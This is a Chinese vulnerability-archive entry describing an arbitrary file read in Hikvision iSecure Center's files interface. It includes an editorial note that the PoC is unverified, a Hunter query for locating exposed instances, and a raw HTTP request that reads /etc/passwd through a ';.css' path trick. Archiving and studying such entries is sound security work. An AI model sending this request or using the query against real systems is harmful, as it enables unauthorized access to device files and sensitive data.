---
source: "wy876 漏洞文库"
id: "vw-922756223f81e7928a2fe369"
entity_id: "ve-922756223f81e7928a2fe369"
schema_version: "1"
title: "海康威视iSecure Center 综合安防管理平台files 接口存在任意文件读取漏洞"
product: "Hikvision iSecure Center LM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无Cookie，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86iSecureCenter%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0files%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/unwcbu4dxgpzlizn"
source_status: "recorded"
previous_fofa_unverified: "查询语法：**"
hunter: "app.name==\"Hikvision 海康威视 iSecure Center\""
---

# 海康威视iSecure Center 综合安防管理平台files 接口存在任意文件读取漏洞

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Hikvision iSecure Center LM
- 本文讨论：lm/api/files;.css link本地文件读取
- 版本、权限与配置前提：无Cookie，版本未知
- 资料类型：文件读取PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- GET读取与871同路由POST上传是不同能力，应分动作而不按files合并
- 没有响应/源码/权限边界；Hunter查询内含font标签，元数据抽取错误
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 分号后缀和link解析、认证/版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">HIKVISION iSecure Center综合安防管理平台是一套“集成化”、“智能化”的平台，通过接入视频监控、一卡通、停车场、报警检测等系统的设备，获取边缘节点数据，实现安防信息化集成与联动，以电子地图为载体，融合各系统能力实现丰富的智能应用。HIKVISION iSecure Center平台基于“统一软件技术架构”先进理念设计，采用业务组件化技术，满足平台在业务上的弹性扩展。该平台适用于全行业通用综合安防业务，对各系统资源进行了整合和集中管理，实现统一部署、统一配置、统一管理和统一调度。海康威视iSecure Center 综合安防管理平台files 接口存在任意文件读取漏洞，攻击者可通过该漏洞读取服务器上任意文件，获取敏感信息。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ <font style="color:rgb(0, 0, 0);">HIKVISION iSecure Center综合安防管理平台</font>

# <font style="color:rgb(0, 0, 0);">三、</font><font style="color:rgb(0, 0, 0);">资产测绘</font>
**hunter查询语法：**

`<font style="color:rgb(0, 0, 0);">app.name=="Hikvision 海康威视 iSecure Center"</font>`


+ <font style="color:rgb(0, 0, 0);">登录页面</font>


# <font style="color:rgb(0, 0, 0);">四、漏洞复现</font>
```http
GET /lm/api/files;.css?link=/etc/passwd HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate, br
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/unwcbu4dxgpzlizn>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
